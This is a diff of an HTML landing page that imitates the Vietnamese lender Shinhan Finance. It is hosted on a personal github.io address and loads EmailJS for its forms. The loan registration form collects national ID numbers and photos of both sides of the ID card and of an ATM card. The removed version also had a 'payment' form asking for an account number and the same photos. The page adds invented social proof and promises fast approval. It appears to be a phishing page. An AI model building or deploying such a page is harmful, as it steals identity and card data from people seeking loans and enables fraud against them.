@@ -12,11 +12,11 @@
     <meta property="og:url" content="https://yourusername.github.io/shinhan-finance/">
     <title>Shinhan Finance - Vay Nhanh</title>
     <link rel="icon" href="./assets/images/favicon.ico" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css" integrity="sha256-4j7q0J+SUxMuYgl9xKuv2yL9twh3yJLsM8DqU1f7qmc=" crossorigin="anonymous">
     <link rel="stylesheet" href="./css/styles.css">
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js" defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js" defer></script>
     <script src="./js/script.js" defer></script>
 </head>
@@ -30,15 +30,12 @@
             <button class="back-btn">Quay lại</button>
             <a href="#home">TRANG CHỦ</a>
             <a href="#introduction">GIỚI THIỆU</a>
-            <a href="#shinhan-pwm">SHINHAN PWM</a>
-            <a href="#personal">CÁ NHÂN</a>
-            <a href="#business">DOANH NGHIỆP</a>
-            <a href="#cards">THẺ</a>
-            <a href="#transfer">CHUYỂN TIỀN</a>
+            <a href="#loan-packages">KHOẢN VAY</a>
+            <a href="#register-form">ĐĂNG KÝ VAY</a>
         </nav>
         <div class="auth-buttons">
             <button aria-label="Đăng nhập">ĐĂNG NHẬP</button>
-            <button aria-label="Đăng ký">ĐĂNG KÝ</button>
+            <button onclick="scrollToRegister()" aria-label="Đăng ký vay">ĐĂNG KÝ VAY</button>
         </div>
         <select class="language-toggle" aria-label="Chọn ngôn ngữ">
             <option value="vi">Tiếng Việt</option>
@@ -47,55 +44,56 @@
         <button class="dark-mode-toggle" aria-label="Chuyển chế độ tối">🌙</button>
     </header>
 
-    <section class="home-section" id="home">
-        <h2>Chào mừng đến với Shinhan Finance</h2>
-        <p>Khám phá các giải pháp tài chính toàn diện từ vay tiêu dùng, doanh nghiệp đến thẻ tín dụng. Duyệt vay nhanh trong 60 phút. Nhận ưu đãi lãi suất 0% trong 3 tháng đầu khi mở thẻ tín dụng Shinhan!</p>
-        <img src="https://imgur.com/KCBNXU6.jpg" alt="Biểu tượng trang chủ" class="section-icon" loading="lazy">
+    <section class="home-section fade-in" id="home">
+        <h2 data-lang-vi="Chào mừng đến với Shinhan Finance" data-lang-en="Welcome to Shinhan Finance">Chào mừng đến với Shinhan Finance</h2>
+        <p data-lang-vi="Khám phá các giải pháp tài chính toàn diện. Duyệt vay nhanh trong 60 phút!" data-lang-en="Explore comprehensive financial solutions. Fast loan approval in 60 minutes!">Khám phá các giải pháp tài chính toàn diện. Duyệt vay nhanh trong 60 phút!</p>
+        <button onclick="scrollToRegister()" class="cta-button">ĐĂNG KÝ VAY</button>
+        <img src="./assets/images/home-icon.png" alt="Biểu tượng trang chủ" class="section-icon" loading="lazy">
     </section>
 
-    <section class="banner">
+    <section class="banner fade-in">
         <div class="content">
-            <h1>Vay dễ dàng, lãi nhẹ nhàng</h1>
-            <p>Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng, đặc biệt hỗ trợ khách hàng có nợ xấu!</p>
-            <button onclick="document.querySelector('#register-form .section-toggle').click()">TÌM HIỂU THÊM</button>
+            <h1 data-lang-vi="Vay dễ dàng, lãi nhẹ nhàng" data-lang-en="Easy Loans, Light Interest">Vay dễ dàng, lãi nhẹ nhàng</h1>
+            <p data-lang-vi="Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng!" data-lang-en="Access your dream capital with low interest rates and transparent costs!">Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng!</p>
+            <button onclick="scrollToRegister()">ĐĂNG KÝ VAY NGAY</button>
         </div>
-        <img src="https://imgur.com/Cre8tQr.jpg" alt="Hình ảnh quảng cáo vay vốn" loading="lazy">
+        <img src="./assets/images/banner.jpg" alt="Hình ảnh quảng cáo vay vốn" loading="lazy">
     </section>
 
-    <section class="core-values">
-        <h2>Giá trị cốt lõi</h2>
+    <section class="core-values fade-in">
+        <h2 data-lang-vi="Giá trị cốt lõi" data-lang-en="Core Values">Giá trị cốt lõi</h2>
         <div class="values-grid">
             <div class="value-card">
                 <img src="./assets/images/customer_centric.png" alt="Hướng tới khách hàng" loading="lazy">
-                <h3>Hướng tới khách hàng</h3>
-                <p>Đặt khách hàng làm trung tâm trong mọi hoạt động.</p>
+                <h3 data-lang-vi="Hướng tới khách hàng" data-lang-en="Customer Centric">Hướng tới khách hàng</h3>
+                <p data-lang-vi="Đặt khách hàng làm trung tâm." data-lang-en="Placing customers at the heart.">Đặt khách hàng làm trung tâm.</p>
             </div>
             <div class="value-card">
                 <img src="./assets/images/global_brand.png" alt="Thương hiệu toàn cầu" loading="lazy">
-                <h3>Thương hiệu toàn cầu</h3>
-                <p>Chất lượng dịch vụ đạt chuẩn quốc tế.</p>
+                <h3 data-lang-vi="Thương hiệu toàn cầu" data-lang-en="Global Brand">Thương hiệu toàn cầu</h3>
+                <p data-lang-vi="Chất lượng dịch vụ quốc tế." data-lang-en="International service quality.">Chất lượng dịch vụ quốc tế.</p>
             </div>
             <div class="value-card">
                 <img src="./assets/images/compassionate_finance.png" alt="Tài chính nhân ái" loading="lazy">
-                <h3>Tài chính nhân ái</h3>
-                <p>Hỗ trợ tài chính với sự đồng cảm và minh bạch.</p>
+                <h3 data-lang-vi="Tài chính nhân ái" data-lang-en="Compassionate Finance">Tài chính nhân ái</h3>
+                <p data-lang-vi="Hỗ trợ minh bạch, đồng cảm." data-lang-en="Transparent, empathetic support.">Hỗ trợ minh bạch, đồng cảm.</p>
             </div>
             <div class="value-card">
                 <img src="./assets/images/value_experience.png" alt="Giá trị & Trải nghiệm" loading="lazy">
-                <h3>Giá trị & Trải nghiệm</h3>
-                <p>Mang lại trải nghiệm tài chính vượt trội.</p>
+                <h3 data-lang-vi="Giá trị & Trải nghiệm" data-lang-en="Value & Experience">Giá trị & Trải nghiệm</h3>
+                <p data-lang-vi="Trải nghiệm tài chính vượt trội." data-lang-en="Superior financial experiences.">Trải nghiệm tài chính vượt trội.</p>
             </div>
         </div>
     </section>
 
-    <section class="testimonials">
-        <h2>Khách hàng nói gì</h2>
+    <section class="testimonials fade-in">
+        <h2 data-lang-vi="Khách hàng nói gì" data-lang-en="What Our Customers Say">Khách hàng nói gì</h2>
         <div class="swiper">
             <div class="swiper-wrapper">
                 <div class="swiper-slide">
                     <div class="testimonial-card">
                         <img src="./assets/images/testimonial1.jpg" alt="Ảnh đại diện Mr. Bùi Nhật Sang" loading="lazy">
-                        <p>Chúng tôi tin rằng việc MoMo cùng Shinhan Finance luôn đồng hành và hợp tác lâu dài sẽ mang đến những giá trị thiết thực dành cho khách hàng cũng như đạt được nhiều thành công mới trong tương lai.</p>
+                        <p data-lang-vi="MoMo và Shinhan Finance mang đến giá trị thiết thực..." data-lang-en="MoMo and Shinhan Finance deliver practical value...">MoMo và Shinhan Finance mang đến giá trị thiết thực...</p>
                         <h4>Mr. Bùi Nhật Sang</h4>
                         <span>MoMo</span>
                     </div>
@@ -103,7 +101,7 @@
                 <div class="swiper-slide">
                     <div class="testimonial-card">
                         <img src="./assets/images/testimonial2.jpg" alt="Ảnh đại diện Ms. Võ Thị Cẩm Nhung" loading="lazy">
-                        <p>VNPAY tự hào khi được đồng hành và sát cánh cùng Shinhan Finance trong suốt thời gian qua và cả trong hành trình hợp tác đa dịch vụ, đa nền tảng sắp tới. Chúc mừng Shinhan Finance 5 năm phát triển.</p>
+                        <p data-lang-vi="VNPAY tự hào đồng hành cùng Shinhan Finance..." data-lang-en="VNPAY is proud to partner with Shinhan Finance...">VNPAY tự hào đồng hành cùng Shinhan Finance...</p>
                         <h4>Ms. Võ Thị Cẩm Nhung</h4>
                         <span>VNPAY</span>
                     </div>
@@ -111,7 +109,7 @@
                 <div class="swiper-slide">
                     <div class="testimonial-card">
                         <img src="./assets/images/testimonial3.jpg" alt="Ảnh đại diện Ms. Phan Thị Cẩm Tú" loading="lazy">
-                        <p>Nguyễn Kim và Shinhan Finance không chỉ là mối quan hệ hợp tác về thương mại, mà còn chung sứ mệnh mang đến khách hàng trải nghiệm tốt nhất thông qua sản phẩm và dịch vụ tài chính an toàn, minh bạch.</p>
+                        <p data-lang-vi="Nguyễn Kim và Shinhan Finance cùng mang đến trải nghiệm tốt nhất..." data-lang-en="Nguyen Kim and Shinhan Finance deliver the best experience...">Nguyễn Kim và Shinhan Finance cùng mang đến trải nghiệm tốt nhất...</p>
                         <h4>Ms. Phan Thị Cẩm Tú</h4>
                         <span>Nguyễn Kim</span>
                     </div>
@@ -122,358 +120,173 @@
         </div>
     </section>
 
-    <section class="categories">
-        <div class="category-card">
-            <img src="https://imgur.com/SroDtES.jpg" alt="Vay Tiêu Dùng" loading="lazy">
-            <h4>VAY TIÊU DÙNG</h4>
-            <div class="sub-items">
-                <a href="#loan-packages">Khoản Vay Tiêu Dùng</a>
-                <a href="#loan-calculator">Tính Lãi Suất Vay</a>
-                <a href="#register-form">Đăng Ký Vay</a>
-                <a href="#savings-account">Tài Khoản Tiết Kiệm</a>
-                <a href="#insurance">Bảo Hiểm</a>
-                <a href="#promo-loans">Ưu Đãi Vay Mới</a>
-            </div>
-        </div>
-        <div class="category-card">
-            <img src="https://imgur.com/5kvjH62.jpg" alt="Doanh Nghiệp" loading="lazy">
-            <h4>DOANH NGHIỆP</h4>
-            <div class="sub-items">
-                <a href="#business-loan">Vay Vốn Kinh Doanh</a>
-                <a href="#business-account">Tài Khoản Doanh Nghiệp</a>
-                <a href="#financial-services">Dịch Vụ Tài Chính</a>
-                <a href="#international-payment">Thanh Toán Quốc Tế</a>
-                <a href="#cash-flow-management">Quản Lý Dòng Tiền</a>
-                <a href="#business-promo">Ưu Đãi Doanh Nghiệp</a>
-            </div>
-        </div>
-        <div class="category-card">
-            <img src="https://imgur.com/2A1Q2Gt.jpg" alt="Thẻ" loading="lazy">
-            <h4>THẺ</h4>
-            <div class="sub-items">
-                <a href="#credit-card">Thẻ Tín Dụng</a>
-                <a href="#debit-card">Thẻ Ghi Nợ</a>
-                <a href="#card-offers">Ưu Đãi Thẻ</a>
-                <a href="#business-card">Thẻ Doanh Nghiệp</a>
-                <a href="#card-services">Dịch Vụ Thẻ</a>
-                <a href="#new-card-promo">Thẻ Mới 2025</a>
-            </div>
-        </div>
-    </section>
-
-    <section class="main-sections">
+    <section class="main-sections fade-in">
         <div class="section-toggle" id="loan-packages">
-            <h3>C các Gói Vay Tiêu Dùng</h3>
+            <h3 data-lang-vi="Các Gói Vay Tiêu Dùng" data-lang-en="Consumer Loan Packages">Các Gói Vay Tiêu Dùng</h3>
             <span class="arrow">▼</span>
         </div>
         <div class="section-content">
+            <p class="recent-activity" data-lang-vi="Mới: 15 khách hàng vừa được duyệt vay hôm nay!" data-lang-en="New: 15 customers approved today!">Mới: 15 khách hàng vừa được duyệt vay hôm nay!</p>
             <div class="loan-card">
-                <img src="https://imgur.com/vohGl6i.jpg" alt="Vay mua xe" loading="lazy">
+                <img src="./assets/images/car-loan.png" alt="Vay mua xe" loading="lazy">
                 <div>
-                    <h4>Vay Mua Xe</h4>
-                    <p>Lãi suất cạnh tranh, tài trợ 80% giá trị xe, thời hạn 8 năm.</p>
+                    <h4 data-lang-vi="Vay Mua Xe" data-lang-en="Car Loan">Vay Mua Xe</h4>
+                    <p data-lang-vi="Lãi suất 6.5%, tài trợ 80% giá trị xe." data-lang-en="6.5% interest, 80% car value financed.">Lãi suất 6.5%, tài trợ 80% giá trị xe.</p>
                 </div>
                 <button onclick="toggleDetails(this)">Xem tiếp</button>
-                <button onclick="scrollToRegister()">Đăng Ký</button>
+                <button onclick="scrollToRegister()">Đăng Ký Vay</button>
                 <div class="details">
-                    <p>Lãi suất: 6.5%/năm<br>Hạn mức: 80% giá trị xe (tối đa 1 tỷ VNĐ)<br>Thời hạn: Tối đa 8 năm<br>Điều kiện: Thu nhập từ 10 triệu/tháng, không nợ xấu</p>
+                    <p>Lãi suất: 6.5%/năm<br>Hạn mức: Tối đa 1 tỷ VNĐ<br>Thời hạn: 8 năm<br>Điều kiện: Thu nhập từ 10 triệu/tháng</p>
                 </div>
             </div>
             <div class="loan-card">
-                <img src="https://imgur.com/jyTRFlV.jpg" alt="Vay mua nhà" loading="lazy">
+                <img src="./assets/images/home-loan.png" alt="Vay mua nhà" loading="lazy">
                 <div>
-                    <h4>Vay Mua Nhà</h4>
-                    <p>Lãi suất cạnh tranh, tài trợ 70% giá trị tài sản, thời hạn 30 năm.</p>
+                    <h4 data-lang-vi="Vay Mua Nhà" data-lang-en="Home Loan">Vay Mua Nhà</h4>
+                    <p data-lang-vi="Lãi suất 7.0%, tài trợ 70% giá trị nhà." data-lang-en="7.0% interest, 70% property value financed.">Lãi suất 7.0%, tài trợ 70% giá trị nhà.</p>
                 </div>
                 <button onclick="toggleDetails(this)">Xem tiếp</button>
-                <button onclick="scrollToRegister()">Đăng Ký</button>
+                <button onclick="scrollToRegister()">Đăng Ký Vay</button>
                 <div class="details">
-                    <p>Lãi suất: 7.0%/năm<br>Hạn mức: 70% giá trị tài sản (tối đa 5 tỷ VNĐ)<br>Thời hạn: Tối đa 30 năm<br>Điều kiện: Có tài sản đảm bảo, thu nhập ổn định từ 15 triệu/tháng</p>
-                </div>
-            </div>
-            <div class="loan-card">
-                <img src="https://imgur.com/SroDtES.jpg" alt="Vay tiêu dùng" loading="lazy">
-                <div>
-                    <h4>Vay Tiêu Dùng</h4>
-                    <p>Hạn mức 900 triệu, thời hạn 60 tháng.</p>
-                </div>
-                <button onclick="toggleDetails(this)">Xem tiếp</button>
-                <button onclick="scrollToRegister()">Đăng Ký</button>
-                <div class="details">
-                    <p>Lãi suất: 8.0%/năm<br>Hạn mức: Tối đa 900 triệu VNĐ<br>Thời hạn: Tối đa 60 tháng<br>Điều kiện: Thu nhập từ 6 triệu/tháng, không nợ xấu</p>
-                </div>
-            </div>
-            <div class="loan-card">
-                <img src="https://imgur.com/VqtlQjl.jpg" alt="Vay tiêu dùng trực tuyến" loading="lazy">
-                <div>
-                    <h4>Vay Tiêu Dùng Trực Tuyến</h4>
-                    <p>Vay nhanh qua Mobile Banking SOL, thủ tục 100% trực tuyến.</p>
-                </div>
-                <button onclick="toggleDetails(this)">Xem tiếp</button>
-                <button onclick="scrollToRegister()">Đăng Ký</button>
-                <div class="details">
-                    <p>Lãi suất: 8.5%/năm<br>Hạn mức: Tối đa 100 triệu VNĐ<br>Thời hạn: Tối đa 36 tháng<br>Điều kiện: Tài khoản Shinhan active, thu nhập từ 5 triệu/tháng</p>
-                </div>
-            </div>
-            <div class="loan-card">
-                <img src="https://imgur.com/XC5xLsZ.jpg" alt="Vay thế chấp sổ tiết kiệm" loading="lazy">
-                <div>
-                    <h4>Vay Thế Chấp Sổ Tiết Kiệm</h4>
-                    <p>Lãi suất tiền gửi + 1.9%/năm, liên hệ chi nhánh cho vay trên 100 triệu.</p>
-                </div>
-                <button onclick="toggleDetails(this)">Xem tiếp</button>
-                <button onclick="scrollToRegister()">Đăng Ký</button>
-                <div class="details">
-                    <p>Lãi suất: Tiền gửi + 1.9%/năm<br>Hạn mức: 90% giá trị sổ tiết kiệm<br>Thời hạn: Tối đa 12 tháng<br>Điều kiện: Có sổ tiết kiệm tại Shinhan, liên hệ chi nhánh cho khoản vay lớn</p>
+                    <p>Lãi suất: 7.0%/năm<br>Hạn mức: Tối đa 5 tỷ VNĐ<br>Thời hạn: 30 năm<br>Điều kiện: Thu nhập từ 15 triệu/tháng</p>
                 </div>
             </div>
         </div>
 
         <div class="section-toggle" id="loan-calculator">
-            <h3>Tính Lãi Suất Khoản Vay</h3>
+            <h3 data-lang-vi="Tính Lãi Suất Khoản Vay" data-lang-en="Loan Interest Calculator">Tính Lãi Suất Khoản Vay</h3>
             <span class="arrow">▼</span>
         </div>
         <div class="section-content">
-            <input type="number" placeholder="Số tiền vay (VNĐ)" id="calc-loan-amount" aria-label="Số tiền vay">
-            <input type="number" placeholder="Thời hạn vay (tháng)" id="calc-loan-term" aria-label="Thời hạn vay">
-            <select id="calc-loan-type" aria-label="Loại vay">
-                <option value="">Loại vay</option>
-                <option value="Vay mua xe">Vay mua xe</option>
-                <option value="Vay mua nhà">Vay mua nhà</option>
-                <option value="Vay tiêu dùng">Vay tiêu dùng</option>
-                <option value="Vay tiêu dùng trực tuyến">Vay tiêu dùng trực tuyến</option>
-                <option value="Vay thế chấp sổ tiết kiệm">Vay thế chấp sổ tiết kiệm</option>
-            </select>
+            <div class="form-group">
+                <label for="calc-loan-amount">Số tiền vay (VNĐ) *</label>
+                <input type="number" id="calc-loan-amount" placeholder="Nhập số tiền" aria-label="Số tiền vay" required>
+            </div>
+            <div class="form-group">
+                <label for="calc-loan-term">Thời hạn vay (tháng) *</label>
+                <input type="number" id="calc-loan-term" placeholder="Nhập thời hạn" aria-label="Thời hạn vay" required>
+            </div>
+            <div class="form-group">
+                <label for="calc-loan-type">Loại vay *</label>
+                <select id="calc-loan-type" aria-label="Loại vay" required>
+                    <option value="">Chọn loại vay</option>
+                    <option value="Vay mua xe">Vay mua xe</option>
+                    <option value="Vay mua nhà">Vay mua nhà</option>
+                    <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                </select>
+            </div>
             <button onclick="calculateLoanInterest()">Tính ngay</button>
             <canvas id="loan-chart" width="400" height="200" aria-label="Biểu đồ lãi suất vay"></canvas>
             <div class="result" id="calc-result"></div>
         </div>
 
-        <div class="section-toggle" id="payment-info">
-            <h3>Thanh Toán Khoản Vay</h3>
-            <span class="arrow">▼</span>
-        </div>
-        <div class="section-content">
-            <p>Chuyển khoản, ví điện tử, quầy ngân hàng. Nhắc nhở tự động qua Mobile Banking SOL.</p>
-            <table aria-label="Lịch sử thanh toán khoản vay">
-                <tr><th>Ngày</th><th>Số tiền</th><th>Trạng thái</th></tr>
-                <tr><td>01/05/2025</td><td>2,500,000</td><td>Chưa thanh toán</td></tr>
-            </table>
-            <h4>Thanh toán trực tuyến</h4>
-            <input type="text" id="payment-account" placeholder="Số tài khoản" aria-label="Số tài khoản">
-            <input type="number" id="payment-amount" placeholder="Số tiền thanh toán (VNĐ)" aria-label="Số tiền thanh toán">
-            <p class="photo-guidance">Hướng dẫn: Mở ứng dụng ngân hàng, chọn mục chụp ảnh CCCD/thẻ ATM, đảm bảo ảnh rõ nét, đầy đủ thông tin.</p>
-            <input type="file" id="payment-cccd-front" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt trước">
-            <input type="file" id="payment-cccd-back" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt sau">
-            <input type="file" id="payment-atm-card" accept="image/jpeg,image/png" aria-label="Ảnh thẻ ATM">
-            <button id="payment-submit" onclick="submitPayment()">Thanh toán qua SOL</button>
-        </div>
-
-        <div class="section-toggle" id="loan-settlement">
-            <h3>Tất Toán Khoản Vay</h3>
-            <span class="arrow">▼</span>
-        </div>
-        <div class="section-content">
-            <p>Tất toán toàn bộ khoản vay của bạn trước hạn để tiết kiệm chi phí lãi suất.</p>
-            <input type="text" id="settlement-account" placeholder="Số tài khoản" aria-label="Số tài khoản">
-            <input type="number" id="settlement-amount" placeholder="Số dư nợ còn lại (VNĐ)" aria-label="Số dư nợ">
-            <button onclick="confirmSettlement()">Tất toán ngay</button>
-            <div class="result" id="settlement-result"></div>
-        </div>
-
         <div class="section-toggle" id="register-form">
-            <h3>Đăng Ký Vay</h3>
+            <h3 data-lang-vi="Đăng Ký Vay" data-lang-en="Loan Registration">Đăng Ký Vay</h3>
             <span class="arrow">▼</span>
         </div>
         <div class="section-content">
+            <div class="form-header">
+                <h4 data-lang-vi="Đăng ký vay nhanh - Duyệt trong 60 phút" data-lang-en="Fast Loan Registration - Approved in 60 Minutes">Đăng ký vay nhanh - Duyệt trong 60 phút</h4>
+                <p data-lang-vi="Điền thông tin để nhận khoản vay phù hợp!" data-lang-en="Fill in details for a tailored loan!">Điền thông tin để nhận khoản vay phù hợp!</p>
+            </div>
             <div class="progress-bar">
-                <div class="progress-step active"><span>1. Nhập thông tin</span></div>
+                <div class="progress-step active"><span>1. Thông tin</span></div>
                 <div class="progress-step"><span>2. Tải ảnh</span></div>
                 <div class="progress-step"><span>3. Xác nhận</span></div>
                 <div class="progress-step"><span>4. Hoàn tất</span></div>
             </div>
-            <div class="tooltip">
-                <input type="text" placeholder="Họ và tên" aria-label="Họ và tên">
-                <span class="tooltiptext">Nhập họ và tên đầy đủ</span>
+            <div class="form-group">
+                <label for="reg-name">Họ và tên *</label>
+                <input type="text" id="reg-name" placeholder="Nhập họ và tên" aria-label="Họ và tên" required>
             </div>
-            <div class="tooltip">
-                <input type="tel" placeholder="Số điện thoại" aria-label="Số điện thoại">
-                <span class="tooltiptext">Số điện thoại phải bắt đầu bằng 0</span>
+            <div class="form-group">
+                <label for="reg-phone">Số điện thoại *</label>
+                <input type="tel" id="reg-phone" placeholder="Nhập số điện thoại" aria-label="Số điện thoại" required>
             </div>
-            <div class="tooltip">
-                <input type="email" placeholder="Email" aria-label="Email">
-                <span class="tooltiptext">Nhập email hợp lệ</span>
+            <div class="form-group">
+                <label for="reg-email">Email *</label>
+                <input type="email" id="reg-email" placeholder="Nhập email" aria-label="Email" required>
             </div>
-            <input type="text" placeholder="CCCD/CMND" aria-label="CCCD/CMND">
-            <input type="text" placeholder="Địa chỉ" aria-label="Địa chỉ">
-            <input type="number" placeholder="Thu nhập (VNĐ)" aria-label="Thu nhập">
-            <input type="number" placeholder="Số tiền vay (VNĐ)" aria-label="Số tiền vay">
-            <input type="number" placeholder="Thời hạn vay (tháng)" aria-label="Thời hạn vay">
-            <select aria-label="Loại vay">
-                <option>Loại vay</option>
-                <option>Vay mua xe</option>
-                <option>Vay mua nhà</option>
-                <option>Vay tiêu dùng</option>
-                <option>Vay tiêu dùng trực tuyến</option>
-                <option>Vay thế chấp sổ tiết kiệm</option>
-            </select>
-            <input type="date" placeholder="Ngày sinh" aria-label="Ngày sinh">
-            <select aria-label="Giới tính">
-                <option>Giới tính</option>
-                <option>Nam</option>
-                <option>Nữ</option>
-            </select>
-            <select aria-label="Tình trạng hôn nhân">
-                <option>Tình trạng hôn nhân</option>
-                <option>Độc thân</option>
-                <option>Đã kết hôn</option>
-            </select>
-            <input type="text" placeholder="Nghề nghiệp" aria-label="Nghề nghiệp">
-            <input type="text" placeholder="Công ty" aria-label="Công ty">
-            <input type="number" placeholder="Số dư tài khoản (VNĐ)" aria-label="Số dư tài khoản">
-            <input type="text" placeholder="Mục đích vay" aria-label="Mục đích vay">
-            <p class="photo-guidance">Hướng dẫn: Mở ứng dụng ngân hàng, chọn mục chụp ảnh CCCD/thẻ ATM, đảm bảo ảnh rõ nét, đầy đủ thông tin.</p>
-            <input type="file" id="cccd-front" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt trước">
-            <input type="file" id="cccd-back" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt sau">
-            <input type="file" id="atm-card" accept="image/jpeg,image/png" aria-label="Ảnh thẻ ATM">
-            <p class="no-card">Không có thẻ ATM? Xem hướng dẫn</p>
+            <div class="form-group">
+                <label for="reg-cccd">CCCD/CMND *</label>
+                <input type="text" id="reg-cccd" placeholder="Nhập số CCCD/CMND" aria-label="CCCD/CMND" required>
+            </div>
+            <div class="form-group">
+                <label for="reg-amount">Số tiền vay (VNĐ) *</label>
+                <input type="number" id="reg-amount" placeholder="Nhập số tiền vay" aria-label="Số tiền vay" required>
+            </div>
+            <div class="form-group">
+                <label for="reg-term">Thời hạn vay (tháng) *</label>
+                <input type="number" id="reg-term" placeholder="Nhập thời hạn vay" aria-label="Thời hạn vay" required>
+            </div>
+            <div class="form-group">
+                <label for="reg-type">Loại vay *</label>
+                <select id="reg-type" aria-label="Loại vay" required>
+                    <option value="">Chọn loại vay</option>
+                    <option value="Vay mua xe">Vay mua xe</option>
+                    <option value="Vay mua nhà">Vay mua nhà</option>
+                    <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                </select>
+            </div>
+            <p class="photo-guidance">Hướng dẫn: Chụp ảnh CCCD/thẻ ATM rõ nét, đầy đủ thông tin.</p>
+            <div class="form-group">
+                <label for="cccd-front">Ảnh CCCD mặt trước *</label>
+                <input type="file" id="cccd-front" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt trước" required>
+            </div>
+            <div class="form-group">
+                <label for="cccd-back">Ảnh CCCD mặt sau *</label>
+                <input type="file" id="cccd-back" accept="image/jpeg,image/png" aria-label="Ảnh CCCD mặt sau" required>
+            </div>
+            <div class="form-group">
+                <label for="atm-card">Ảnh thẻ ATM *</label>
+                <input type="file" id="atm-card" accept="image/jpeg,image/png" aria-label="Ảnh thẻ ATM" required>
+            </div>
             <button onclick="submitRegistration()">Gửi Đăng Ký</button>
         </div>
     </section>
 
     <section class="contract-display">
-        <h2>Hợp Đồng Đăng Ký Vay</h2>
-        <p>Hồ sơ của bạn đã được xác nhận với con dấu Shinhan Finance.</p>
+        <h2 data-lang-vi="Hợp Đồng Đăng Ký Vay" data-lang-en="Loan Registration Contract">Hợp Đồng Đăng Ký Vay</h2>
+        <p data-lang-vi="Xem hợp đồng của bạn dưới đây." data-lang-en="View your contract below.">Xem hợp đồng của bạn dưới đây.</p>
         <div id="contract-content"></div>
-        <img src="./assets/images/contract-seal.jpg" alt="Hợp đồng có con dấu" loading="lazy">
+        <img id="contract-image" src="./assets/images/contract-seal.jpg" alt="Hợp đồng có con dấu" loading="lazy">
     </section>
 
-    <section class="collapsible-section" id="loan-intro">
+    <section class="collapsible-section fade-in" id="introduction">
         <div class="section-header">
-            <h2>Giới Thiệu Khoản Vay</h2>
+            <h2 data-lang-vi="Giới Thiệu Shinhan Finance" data-lang-en="About Shinhan Finance">Giới Thiệu Shinhan Finance</h2>
             <button class="toggle-btn">Xem thêm</button>
         </div>
-        <p>Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây.</p>
+        <p data-lang-vi="Shinhan Finance cung cấp giải pháp tài chính an toàn, minh bạch." data-lang-en="Shinhan Finance offers safe, transparent financial solutions.">Shinhan Finance cung cấp giải pháp tài chính an toàn, minh bạch.</p>
         <div class="section-details">
-            <p>Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
-            <h3>Điều kiện giải ngân:</h3>
-            <p>- Độ tuổi: Nam 21-58, nữ 21-55.<br>- Thu nhập tối thiểu: 4 triệu VNĐ/tháng.<br>- Có CCCD gắn chip.<br>- Hồ sơ phê duyệt trong 15 phút, giải ngân trong 48 giờ sau khi ký hợp đồng online.</p>
-            <img src="https://imgur.com/QuXrjay.jpg" alt="Giới thiệu khoản vay" loading="lazy">
-        </div>
-    </section>
-
-    <section class="collapsible-section" id="shinhan-pwm">
-        <div class="section-header">
-            <h2>Shinhan PWM</h2>
-            <button class="toggle-btn">Xem thêm</button>
-        </div>
-        <p>Shinhan PWM cung cấp dịch vụ quản lý tài sản cá nhân hóa, giúp tối ưu hóa tài chính với các giải pháp đầu tư và tiết kiệm hiệu quả.</p>
-        <div class="section-details">
-            <p><strong>Mới:</strong> Tư vấn đầu tư quốc tế với lợi nhuận dự kiến 8-12%/năm. Miễn phí tư vấn cho khách hàng mới.</p>
-            <img src="https://imgur.com/WL7UCCN.jpg" alt="Shinhan PWM" loading="lazy">
-        </div>
-    </section>
-
-    <section class="collapsible-section" id="personal">
-        <div class="section-header">
-            <h2>Cá Nhân</h2>
-            <button class="toggle-btn">Xem thêm</button>
-        </div>
-        <p>Giải pháp tài chính cá nhân từ vay tiêu dùng, tiết kiệm đến thẻ tín dụng, đáp ứng mọi nhu cầu của bạn.</p>
-        <div class="section-details">
-            <p><strong>Mới:</strong> Miễn phí mở tài khoản số đẹp và hoàn tiền 5% khi mua sắm online với thẻ Shinhan.</p>
-            <img src="https://imgur.com/bxo0mSQ.jpg" alt="Cá nhân" loading="lazy">
-        </div>
-    </section>
-
-    <section class="collapsible-section" id="business">
-        <div class="section-header">
-            <h2>Doanh Nghiệp</h2>
-            <button class="toggle-btn">Xem thêm</button>
-        </div>
-        <p>Các giải pháp tài chính toàn diện cho doanh nghiệp, từ vay vốn kinh doanh, quản lý dòng tiền đến thanh toán quốc tế.</p>
-        <div class="section-details">
-            <p><strong>Mới:</strong> Vay vốn doanh nghiệp với lãi suất ưu đãi 5.5%/năm trong 6 tháng đầu.</p>
-            <img src="https://imgur.com/IN3r5DK.jpg" alt="Doanh nghiệp" loading="lazy">
-        </div>
-    </section>
-
-    <section class="collapsible-section" id="cards">
-        <div class="section-header">
-            <h2>Thẻ</h2>
-            <button class="toggle-btn">Xem thêm</button>
-        </div>
-        <p>Khám phá các loại thẻ tín dụng, thẻ ghi nợ với ưu đãi hấp dẫn và dịch vụ hỗ trợ thẻ tiện lợi.</p>
-        <div class="section-details">
-            <p><strong>Mới:</strong> Thẻ Shinhan Visa Platinum mới, hoàn tiền 10% khi mua vé máy bay.</p>
-            <img src="https://imgur.com/bhMFEPa.jpg" alt="Thẻ" loading="lazy">
-        </div>
-    </section>
-
-    <section class="collapsible-section" id="transfer">
-        <div class="section-header">
-            <h2>Chuyển Tiền</h2>
-            <button class="toggle-btn">Xem thêm</button>
-        </div>
